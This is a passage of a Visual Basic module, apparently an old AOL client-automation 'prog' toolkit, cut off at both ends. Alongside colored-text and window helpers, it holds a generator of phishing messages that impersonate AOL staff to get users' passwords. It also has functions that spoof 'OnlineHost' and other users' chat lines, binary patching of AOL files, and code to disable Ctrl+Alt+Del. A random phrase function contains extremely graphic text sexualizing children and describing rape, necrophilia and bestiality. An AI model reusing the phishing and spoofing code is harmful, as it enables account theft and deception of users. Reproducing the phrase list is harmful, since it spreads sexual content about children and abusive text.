    Case 17: BoldPurpleWhite (Text1)
    Case 18: BoldBlackGreenBlack (Text1)
    Case 19: BoldYellow_LBlue_Yellow (Text1)
    Case 20: r_Rainbow (Text1)
Case Else: LBlue_DBlue (Text1)
End Select
End Function
Function BoldPinkOrange(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(255 - f, 167, 510)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function BoldPinkOrangePink(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 167, 510)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function BoldPurpleWhite(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(255, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function BoldPurpleWhitePurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldYellow_LBlue_Yellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function
Function phrase() As String

Randomize Timer
Select Case Int(Rnd * 15)
    Case 0: phrase$ = "I LIKE TO "
    Case 1: phrase$ = "I LOVE TO "
    Case 2: phrase$ = "IT MAKES ME HORNY WHEN I "
    Case 3: phrase$ = "MY ASSHOLE GETS WET WHEN I "
    Case 4: phrase$ = "IT GIVES ME ANAL PLEASURE TO "
    Case 5: phrase$ = "IT MAKES ME CUM WHEN I "
    Case 6: phrase$ = "I MOAN WHEN I "
    Case 7: phrase$ = "I CUM INTO MY ASSHOLE WHEN I "
    Case 8: phrase$ = "I LOVE THE FEELING I GET WHEN I "
    Case 9: phrase$ = "MY ANAL ROLLS JIGGLE WHEN I "
    Case 10: phrase$ = "I INSERT MY PINKY INTO THE TIP OF MY PENIS SO I CAN "
    Case 11: phrase$ = "I POSE AS A PRIEST JUST SO I CAN "
    Case 12: phrase$ = "IT MAKES ME CUM IN MY PANTIES WHEN I "
    Case 13: phrase$ = "I STICK MY THUMB UP MY ASS WHEN I "
    Case 14: phrase$ = "ALL PAIN DISSAPPEARS WHEN I "
End Select
Select Case Int(Rnd * 19)
    Case 0: phrase$ = phrase$ + "FONDLE LITTLE BOYS"
    Case 1: phrase$ = phrase$ + "TOUCH LITTLE GIRLS"
    Case 2: phrase$ = phrase$ + "FINGER FUCK MY ASSHOLE"
    Case 3: phrase$ = phrase$ + "ANALY RAPE CHICKENS"
    Case 4: phrase$ = phrase$ + "ASS FUCK NUNS"
    Case 5: phrase$ = phrase$ + "MOLEST PRE SCHOOLERS"
    Case 6: phrase$ = phrase$ + "STRETCH THE ASSHOLES OF KINDERGARTENERS"
    Case 7: phrase$ = phrase$ + "HAVE A 5 YEAR OLD GIRL SUCK MY PENIS"
    Case 8: phrase$ = phrase$ + "LOOK AT OTHER MEN"
    Case 9: phrase$ = phrase$ + "TOUCH OTHER MENS PENIS'S AND THEN STROKE THEIR SHAFTS"
    Case 10: phrase$ = phrase$ + "MAKE WILD AND PASSIONATE LOVE TO OTHER MEN"
    Case 11: phrase$ = phrase$ + "FINGER MY MOTHERS CUNT"
    Case 12: phrase$ = phrase$ + "STRANGLE LITTLE BOYS THEN RAPE THEIR DEAD BODIES"
    Case 13: phrase$ = phrase$ + "GET INTO THE PANTS OF A 7 YEAR OLD GIRL"
    Case 14: phrase$ = phrase$ + "MOLEST STATUES OF GREAT AMERICAN HEROES"
    Case 15: phrase$ = phrase$ + "BUTT FUCK BILL CLINTON"
    Case 16: phrase$ = phrase$ + "SHOVE A BROOM STICK UP MY PET DOGS ASSHOLE"
    Case 17: phrase$ = phrase$ + "GO TO A PLAYGROUND AND MOLEST THE CHILDREN"
    Case 18: phrase$ = phrase$ + "BREAK IN A 5 YEAR OLDS PUSSY"
End Select
SickPhrase = phrase$
End Function
Sub Shrinkinform(frm As Form)
Dim poopy
poopy = frm.Width
Dim crap
crap = frm.Height
Do

frm.Width = poopy - 10
frm.Height = crap - 10
Loop Until frm.Width = 1 Or frm.Height = 1
End Sub
Sub falling_form(frm As Form, steps As Integer)
'this is a pretty neat sub try
'it out and see what it does
On Error Resume Next
For X = 0 To frm.Count - 1
Next X
AddX = True
AddY = True
frm.Show
X = ((Screen.Width - frm.Width) - frm.Left) / steps
Y = ((Screen.Height - frm.Height) - frm.Top) / steps
Do
    frm.Move frm.Left + X, frm.Top + Y
Loop Until (frm.Left >= (Screen.Width - frm.Width)) Or (frm.Top >= (Screen.Height - frm.Height))
frm.Left = Screen.Width - frm.Width
frm.Top = Screen.Height - frm.Height
frm.BackColor = BgColor
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = True
Next X
End Sub
Function AOLMDI()
aol% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = Findchildbyclass(aol%, "MDIClient")
End Function
Sub AOLSetText(win, Txt)
TheText% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub
Sub AntiPunter()
'this is not the best anti there is use this
'at your own risk it is pretty buggy
Do
ANT% = findchildbytitle(AOLMDI(), "Untitled")
IMRICH% = Findchildbyclass(ANT%, "RICHCNTL")
STS% = Findchildbyclass(ANT%, "_AOL_Static")
st% = GetWindow(STS%, GW_HWNDNEXT)
st% = GetWindow(st%, GW_HWNDNEXT)
Call AOLSetText(st%, "Ritual2x¹ - This IM Window Should Remain OPEN.")
mi = ShowWindow(ANT%, SW_MINIMIZE)
DoEvents:
If IMRICH% <> 0 Then
Lab = SendMessageByNum(IMRICH%, WM_CLOSE, 0, 0)
Lab = SendMessageByNum(IMRICH%, WM_CLOSE, 0, 0)
End If
Loop
End Sub
Sub AOL4_UnUpChat()
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_RESTORE)
Call AOL4_SetFocus
End Sub
Public Sub AOLKillWindow(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Public Sub AOLButton(but%)
Clicicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clicicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub
Sub openim(sn As String)
budlist% = findchildbytitle(AOLMDI(), "Buddy List Window")
Locat% = Findchildbyclass(budlist%, "_AOL_ICON")
IM1% = GetWindow(Locat%, GW_HWNDNEXT)
setup% = GetWindow(IM1%, GW_HWNDNEXT)
ClickIcon (setup%)
Timeout (2)
STUPSCRN% = findchildbytitle(AOLMDI(), AOLGetUser & "'s Buddy Lists")
Creat% = Findchildbyclass(STUPSCRN%, "_AOL_ICON")
Edit% = GetWindow(Creat%, GW_HWNDNEXT)
Delete% = GetWindow(Edit%, GW_HWNDNEXT)
View% = GetWindow(Delete%, GW_HWNDNEXT)
PRCYPREF% = GetWindow(View%, GW_HWNDNEXT)
ClickIcon PRCYPREF%
Timeout (1.8)
Call AOLKillWindow(STUPSCRN%)
Timeout (2)
PRYVCY% = findchildbytitle(AOLMDI(), "Privacy Preferences")
DABUT% = findchildbytitle(PRYVCY%, "Block only those people whose screen names I list")
AOLButton (DABUT%)
DaPERSON% = Findchildbyclass(PRYVCY%, "_AOL_EDIT")
Call AOLSetText(DaPERSON%, sn)
Creat% = Findchildbyclass(PRYVCY%, "_AOL_ICON")
Edit% = GetWindow(Creat%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
ClickIcon Edit%
Timeout (1)
Save% = GetWindow(Edit%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
ClickIcon Save%
End Sub
Function AOLActivate()
X = GetCaption(AOLWindow)
AppActivate X
End Function
Function AOLWindow()
aol% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = aol%
End Function
Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = GetWindow(Findchildbyclass(AOLWindow(), "MDIClient"), 5)
forw% = findchildbytitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(Findchildbyclass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(Findchildbyclass(AOLWindow(), "MDIClient"), 5)
forw% = findchildbytitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = findchildbytitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function


Function FindSendWin(dosloop)
firs% = GetWindow(Findchildbyclass(AOLWindow(), "MDIClient"), 5)
forw% = findchildbytitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(Findchildbyclass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(Findchildbyclass(AOLWindow(), "MDIClient"), 5)
forw% = findchildbytitle(firss%, "Send Now")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = findchildbytitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindSendWin = firs%

Exit Function
begis:
FindSendWin = firss%
End Function
Function FindForwardWindow()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = findchildbytitle(childfocus%, "Send Now")
listere% = Findchildbyclass(childfocus%, "_AOL_Icon")
listerb% = Findchildbyclass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindForwardWindow = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend
End Function

Function Mail_ClickForward()
X = FindOpenMail
If X = 0 Then GoTo last
AOLActivate
SendKeys "{TAB}"
AG:
Timeout (0.2)
SendKeys " "
X = FindSendWin(2)
If X = 0 Then GoTo AG
last:
End Function
Function AOLFindRoom()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = Findchildbyclass(childfocus%, "_AOL_Edit")
listere% = Findchildbyclass(childfocus%, "_AOL_View")
listerb% = Findchildbyclass(childfocus%, "_AOL_Listbox")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then AOLFindRoom = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function
Function hostManipulator(What$)
'a good sub but kinda old style
'Example.... AOLHostManipulator "You are gay"
'This will make the online host say you are gay!
a = String(84, Chr(32))
d = 84 - Len(What$)
c$ = Left(a, d)

View% = Findchildbyclass(AOLFindRoom(), "_AOL_View")
Buffy$ = c$ & "  " & " OnlineHost:" & Chr$(9) & "" & (What$) & ""
X% = SendMessageByString(View%, WM_SETTEXT, 0, Buffy$)
SendChat Buffy$
End Function


Sub AOLIcon(icon%)
Clck% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub FWDMail(Person, Subject, message)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
mail% = findchildbytitle(mdi%, "Fwd: ")
Loop Until mail% <> 0
Timeout 0.4
Do
persn% = Findchildbyclass(mail%, "_AOL_Edit")

Timeout 0.3
'CC% = GetWindow(persn%, 2)
'crap% = GetWindow(CC%, 2)
crap% = GetWindow(crap%, 2)
subj% = GetWindow(crap%, 2)
messag% = GetWindow(subj%, 2)
For ii = 1 To 14
messag = GetWindow(messag%, 2)
Next ii
Loop Until persn% <> 0 And subj% <> 0 And messag% <> 0
Timeout 0.3
Call AOLSetText(persn%, Person)
Call AOLSetText(subj%, Subject)
Call AOLSetText(messag%, message)
Timeout 0.1
but% = Findchildbyclass(mail%, "_AOL_Icon")
For ii = 1 To 14
but% = GetWindow(but%, 2)
'but% = GetWindow(but%, 2)
Next ii
'MsgBox but%

mail% = findchildbytitle(mdi%, "Fwd: ")

Do
Call AOLIcon(but%)
aol% = FindWindow("AOL Frame25", vbNullString)
aom% = FindWindow("_AOL_Modal", vbNullString)
ful% = FindWindow("#32770", "America Online")
'full% = FindChildByTitle(ful%, "You are no longer ignoring Instant Messages.")
If ful% <> 0 Then
closes = SendMessage(ful%, WM_CLOSE, 0, 0)
Timeout 0.2


dsa = AOLFindMail
mail% = findchildbytitle(mdi%, "Fwd: ")
fdMail% = Findchildbyclass(mail%, "_AOL_Edit")
closes = SendMessage(mail%, WM_CLOSE, 0, 0)
Timeout 1
Do
fulno% = findchildbytitle(aol%, "Automatic AOL Mail")
Loop Until fulno% <> 0

If fulno% <> 0 Then
Timeout 0.2
notbut% = findchildbytitle(fulno%, "&No")
MsgBox notbut%
ClickIcon (notbut%)
ClickIcon (notbut%)
GoSub over
End If


Exit Do
End If
Loop Until aom% <> 0
Timeout 0.2

Timeout 0.1
Do
aol% = FindWindow("AOL Frame25", vbNullString)
aom% = FindWindow("_AOL_Modal", vbNullString)
closes = SendMessage(aom%, WM_CLOSE, 0, 0)
Loop Until aom = 0
Timeout 0.3

over:
Do
dsa = AOLFindMail
mail% = findchildbytitle(mdi%, "Fwd: ")
fdMail% = Findchildbyclass(mail%, "_AOL_Edit")
If fdMail% <> 0 Then
closes = SendMessage(mail%, WM_CLOSE, 0, 0)
If dsa = mail% Then Exit Do
End If
Timeout 1
fulno% = Findchildbyclass(aol%, "#32770")
If fulno% <> 0 Then
notbut% = findchildbytitle(fulno%, "&No")
MsgBox notbut%
ClickIcon (notbut%)
ClickIcon (notbut%)
End If
Loop Until fdMail% = 0

End Sub

Function FindMail()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
firs% = GetWindow(mdi%, 5)
listers% = Findchildbyclass(firs%, "RICHCHTL")
listere% = Findchildbyclass(firs%, "_AOL_Static")
listerb% = Findchildbyclass(firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone

firs% = GetWindow(mdi%, GW_CHILD)
While firs%
firs% = GetWindow(firs%, 2)
listers% = Findchildbyclass(firs%, "RICHCHTL")
listere% = Findchildbyclass(firs%, "_AOL_Static")
listerb% = Findchildbyclass(firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
firs% = GetWindow(mdi%, 5)
listers% = Findchildbyclass(firs%, "_AOL_Icon")
listere% = Findchildbyclass(firs%, "_AOL_Icon")
listerb% = Findchildbyclass(firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone
Wend

bone:
room% = firs%
AOLFindMail = room%
End Function
Sub OpenMail()
aol% = FindWindow("AOL Frame25", vbNullString)
Toolbar% = Findchildbyclass(aol%, "AOL Toolbar")
ToolBarChild% = Findchildbyclass(Toolbar%, "_AOL_Toolbar")
TooLBaRB% = Findchildbyclass(ToolBarChild%, "_AOL_Icon")
ClickIcon TooLBaRB%
End Sub

Sub AOLWaitMail()

aol% = FindWindow("AOL Frame25", vbNullString)
AOLMD% = Findchildbyclass(aol%, "MDIClient")
mailwin% = GetTopWindow(AOLMD%)
themail% = Findchildbyclass(AOLMD%, "AOL Child")
themail% = Findchildbyclass(themail%, "_AOL_TabControl")
dsa% = Findchildbyclass(themail%, "_AOL_TabPage")

aoltree% = Findchildbyclass(dsa%, "_AOL_Tree")

Do: DoEvents
firstcount = SendMessage(aoltree%, LB_GETCOUNT, 0, 0)
Timeout (3)
secondcount = SendMessage(aoltree%, LB_GETCOUNT, 0, 0)
If firstcount = secondcount Then Exit Do
Loop


End Sub


Function TosPhrase()
Dim dsa$
Dim das$
dsa$ = ""
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then dsa$ = "Hi [sn], "
If asd = 2 Then dsa$ = "Hello [sn], "
If asd = 3 Then dsa$ = "Good Day [sn], "
If asd = 4 Then dsa$ = "Good Afternoon [sn], "
If asd = 5 Then dsa$ = "Good Evening [sn], "
If asd = 6 Then dsa$ = "Good Morning [sn], "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = dsa$ & "I am with the AOL User Resource Department. "
If asd = 2 Then das$ = dsa$ & "I am Steve Case the C.E.O. of America Online. "
If asd = 3 Then das$ = dsa$ & "I am a Guide for America Online. "
If asd = 4 Then das$ = dsa$ & "I am with the AOL Online Security Force. "
If asd = 5 Then das$ = dsa$ & "I am with AOL's billing department. "
If asd = 6 Then das$ = dsa$ & "I am with the America Online User Department. "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. "
If asd = 2 Then das$ = das$ & "Due to a virus in one of our servers, I am required to validate your password. Failure to do so will cause in immediate canalization of this account."
If asd = 3 Then das$ = das$ & "During your sign on period your password number did not cycle, please respond with the password used when settin up this screen name. Failure to do so will result in immediate cancellation of your account."
If asd = 4 Then das$ = das$ & "Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online. "
If asd = 5 Then das$ = das$ & "I have seen people calling from CANADA using this account. Please verify that you are the correct user by giving me your password. Failure to do so will result in immediate cansellation of this account."
If asd = 6 Then das$ = das$ & "We here at AOL have made a SERIOUS billing error. We have your sign on passoword as 4ry67e, If this is not correct, please respond with the correct password. "
 Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Sorry for this inconvenience. Have a nice day.   :-)"
If asd = 2 Then das$ = das$ & "Thank you and have a nice day using America Online.   :-)"
If asd = 3 Then das$ = das$ & "Thank you and have a nice day.   :-)"
If asd = 4 Then das$ = das$ & "Thank you.   :-)"
If asd = 5 Then das$ = das$ & "Thank you, and enjoy your time on America Online. :-) "
If asd = 6 Then das$ = das$ & "Thank you for your time and cooperation and we hope that you enjoy America Online. :-). "
 
AOLTosPhrase = das$

 
End Function
Sub RenameHost(ByVal AOLDir As String, ByVal NewHost As String)
On Error GoTo ErrHandler
'If InStr(AOLDir$, "3") <> 0 Then Version = 3 Else Version = 25
If Len(NewHost$) > 14 Then MsgBox "WTF are you tryin' to do? Mess AOL's software??", 0, "Error": Error 3110
    chat$ = "aolchat.aol"
    PNum = 4761
Open AOLDir$ + "\tool\" & chat$ For Binary As #1
Seek #1, PNum
Put #1, , NewHost$
Close #1
Exit Sub
ErrHandler:
MsgBox "Renaming the host was UNSUCCESSFUL.  Please try again.", 0, "Error"
End Sub

Public Sub Disable_Ctrl_Alt_Del()
'Disables the Crtl+Alt+Del
 Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub
Public Sub Enable_Ctrl_Alt_Del()
'Enables the Crtl+Alt+Del
 Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub
Sub locateMember(sn)
'This will locate a member online. duh
Call KeyWord("aol://3548:" & sn)
End Sub
Function AOLhwnd() As Integer
'This sets focus on the AOL window
aol = FindWindow("AOL Frame25", vbNullString)
End Function
Function CLicKEnter(win)
'This will press enter
'Call SendCharNum(win, 13)
End Function
Sub GetMemberProfile(sn)
AppActivate "America  Online"
SendKeys "^g"
Timeout 0.9
prof% = findchildbytitle(AOLMDI(), "Get a Member's Profile")
Timeout 0.7
Edit% = Findchildbyclass(prof%, "_AOL_Edit")
Call SendMessageByString(Edit%, WM_SETTEXT, 0, sn)
CLicKEnter (Edit%)
End Sub
Sub FileSearch(File)

Call KeyWord("File Search")
First% = findchildbytitle(AOLMDI(), "Filesearch")
icon% = Findchildbyclass(First%, "_AOL_Icon")
icon% = GetWindow(icon%, 2)

Call ClickIcon(icon%)

Secnd% = findchildbytitle(AOLMDI(), "Software Search")
Edit% = Findchildbyclass(Secnd%, "_AOL_Edit")
Call SendMessageByString(Edit%, WM_SETTEXT, 0, File)
Call SendMessageByNum(rich%, WM_CHAR, 0, 13)
End Sub
Sub AOLtextManipulator2(sn, msgg)
room% = AOLFindRoom()
View% = Findchildbyclass(room%, "RICHCNTL")
sng$ = CStr(Chr(13) + Chr(10) + sn + ":" + Chr(9) + msgg)
q% = SendMessageByString(View%, WM_SETTEXT, 0, sng$)
DoEvents

End Sub
Sub GuideWatch()
'a good sub but kinda old style
Do
    Y = DoEvents()
For index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
Call KeyWord("PC")
MsgBox "A Guide had entered the room."
End If
Next index%
end_ad:
Loop
End Sub
Sub AOLRunMenuByString(stringer As String)
Call RunMenuByString(AOLWindow(), stringer)
End Sub


Function Mail_ListMail(Box As ListBox)
Box.Clear
AOLMDI
mailwin = findchildbytitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = findchildbytitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
Timeout (7)
End If

mailwin = findchildbytitle(AOLMDI, "New Mail")
CountMail
start:
If Counter = AOLCountMail Then GoTo last
Mailtree = Findchildbyclass(mailwin, "_AOL_TREE")
   namelen = SendMessage(Mailtree, LB_GETTEXTLEN, Counter, 0)
    buffer$ = String$(namelen, 0)
    X = SendMessageByString(Mailtree, LB_GETTEXT, Counter, buffer$)
    TabPos = InStr(buffer$, Chr$(9))
    buffer$ = Right$(buffer$, (Len(buffer$) - (TabPos)))
    Box.AddItem buffer$
 Timeout (0.001)
Counter = Counter + 1
GoTo start
last:
End Function

Function Mail_Out_CloseMail()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = Findchildbyclass(aol%, "MDIClient")
A3000% = findchildbytitle(A2000%, "Outgoing FlashMail")
End Function

Function Mail_Out_CursorSet(mailIndex As String)
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = Findchildbyclass(aol%, "MDIClient")
A3000% = findchildbytitle(A2000%, "Outgoing FlashMail")
Mailtree% = Findchildbyclass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(Mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function
Function Mail_Out_ListMail(Box As ListBox)
Box.Clear
AOLMDI
mailwin = findchildbytitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = findchildbytitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
Timeout (7)
End If

mailwin = findchildbytitle(AOLMDI, "Outgoing FlashMail")
CountMail
start:
If Counter = AOLCountMail Then GoTo last
Mailtree = Findchildbyclass(mailwin, "_AOL_TREE")
   namelen = SendMessage(Mailtree, LB_GETTEXTLEN, Counter, 0)
    buffer$ = String$(namelen, 0)
    X = SendMessageByString(Mailtree, LB_GETTEXT, Counter, buffer$)
    TabPos = InStr(buffer$, Chr$(9))
    buffer$ = Right$(buffer$, (Len(buffer$) - (TabPos)))
    Box.AddItem buffer$
 Timeout (0.001)
Counter = Counter + 1
GoTo start
last:
End Function

Function Mail_Out_MailCaption()
End Function

Function Mail_Out_MailCount()
themail% = Findchildbyclass(AOLMDI(), "AOL Child")
thetree% = Findchildbyclass(themail%, "_AOL_Tree")
Mail_Out_MailCount = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function Mail_Out_PressEnter()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = Findchildbyclass(aol%, "MDIClient")
A3000% = findchildbytitle(A2000%, "Outgoing FlashMail")
Mailtree% = Findchildbyclass(A3000%, "_AOL_Tree")
X = SendMessage(Mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(Mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function


Function Mail_PressEnter()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = Findchildbyclass(aol%, "MDIClient")
A3000% = findchildbytitle(A2000%, "New Mail")
Mailtree% = Findchildbyclass(A3000%, "_AOL_Tree")
X = SendMessage(Mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(Mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function



Function Mail_SetCursor(mailIndex As String)
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = Findchildbyclass(aol%, "MDIClient")
A3000% = findchildbytitle(A2000%, "New Mail")
Mailtree% = Findchildbyclass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(Mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function
Function FindOpenMail()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = Findchildbyclass(childfocus%, "RICHCNTL")
listere% = Findchildbyclass(childfocus%, "_AOL_Icon")
listerb% = Findchildbyclass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindOpenMail = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function

Function Mail_MailCaption()
FindOpenMail
Mail_MailCaption = GetCaption(FindOpenMail)
End Function

Function SearchForSelected(Lst As ListBox)
If Lst.List(0) = "" Then
counterf = 0
GoTo last
End If
counterf = -1

start:
counterf = counterf + 1
If Lst.ListCount = counterf + 1 Then GoTo last
If Lst.Selected(counterf) = True Then GoTo last
If couterf = Lst.ListCount Then GoTo last
GoTo start

last:
SearchForSelected = counterf
End Function
Sub AOL4_SetFocus()
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Function AOL4_UpChat()
'this is an upchat that minimizes the
'upload window
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_HIDE)
X = ShowWindow(die%, SW_MINIMIZE)
Call AOL4_SetFocus
End Function
Sub NotOnTop(the As Form)
'This will take a form and make it so that
'it does not stay on top of other forms
'U HAVE TO MAKE THE EXE to SEE IT WERK

SetWinOnTop = SetWindowPos(the.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Function r_Rainbow(strin2 As String)
Let inptxt2$ = strin2
Let lenth2% = Len(inptxt2$)
mad = """"
Dad = "#"

Do While numspc2% <= lenth2%

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "1d1a62" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "182a71" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "094a91" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "106cac" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "0d84c4" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
